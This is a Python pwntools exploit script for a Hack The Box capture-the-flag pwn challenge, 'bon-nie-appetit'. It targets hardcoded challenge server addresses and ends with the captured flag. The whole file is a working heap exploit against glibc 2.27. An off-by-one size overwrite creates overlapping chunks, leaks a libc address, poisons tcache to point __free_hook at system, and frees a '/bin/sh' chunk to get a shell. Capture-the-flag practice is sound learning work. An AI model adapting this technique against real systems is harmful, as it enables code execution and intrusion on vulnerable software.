#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 64.227.37.154 --port 30364 ./bon-nie-appetit
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bon-nie-appetit')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.150.120'
port = int(args.PORT or 31931)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './glibc/'

io = start()

def add(count,msg):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(count))
    io.sendlineafter(": ",msg)

def show(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))

def edit(idx,msg):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",msg)

def delete(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter(": ",str(idx))

libc = ELF("./libc.so.6")

add(0x18,"a"*0x18) # 0
add(0x400,"a") # 1
add(0x100,(p64(0)+p64(0x21))*10) # 2

edit(0,"a"*0x18+"\x91\x04")
delete(1)

add(0x400,"a") # 2

show(2)

io.recvuntil("=> ")
libc.address = u64(io.recvline()[:-2].ljust(8,"\x00")) - 0x3ebca0
print (hex(libc.address))

add(0x70,"a") # 3
add(0x70,"a") # 4

delete(4)
delete(3)

edit(2,p64(libc.sym['__free_hook']))

add(0x70,"a")

add(0x70,p64(libc.sym['system']))

edit(0,"/bin/sh\x00")

delete(0)

# HTB{0n3_l1bc_2.27_w1th_3xtr4_tc4ch3_pl3453}

io.interactive()

